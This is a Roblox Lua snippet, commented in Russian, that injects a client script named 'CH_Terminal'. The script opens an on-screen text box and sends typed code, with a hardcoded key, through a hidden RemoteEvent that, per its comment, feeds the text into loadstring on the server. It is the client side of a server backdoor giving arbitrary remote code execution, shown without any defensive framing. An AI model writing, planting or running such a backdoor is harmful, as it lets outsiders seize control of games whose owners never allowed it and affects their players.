local function _C_INJECT(p)
    local s = Instance.new("LocalScript")
    s.Name = "CH_Terminal"
    s.Source = [[
        local r = game:GetService("ReplicatedStorage")
        local i = "\240\159\141\149"
        local k = "TheOneTrueKey42"
        local ev = r:WaitForChild(i)

        -- Создаем GUI для ввода кода
        local sg = Instance.new("ScreenGui", game:GetService("CoreGui") or script.Parent)
        local frame = Instance.new("Frame", sg)
        frame.Size = UDim2.new(0, 300, 0, 50)
        frame.Position = UDim2.new(0.5, -150, 0, 10)
        
        local input = Instance.new("TextBox", frame)
        input.Size = UDim2.new(1, 0, 1, 0)
        input.PlaceholderText = "Введи код (напр. game.Workspace.Part:Destroy())"
        input.Text = ""

        input.FocusLost:Connect(function(enterPressed)
            if enterPressed and input.Text ~= "" then
                -- Отправляем твой текст прямо в loadstring на сервер
                ev:FireServer(k, input.Text)
                print("Код отправлен: " .. input.Text)
                input.Text = ""
            end
        end)
    ]]
    s.Parent = p:WaitForChild("PlayerGui")
end
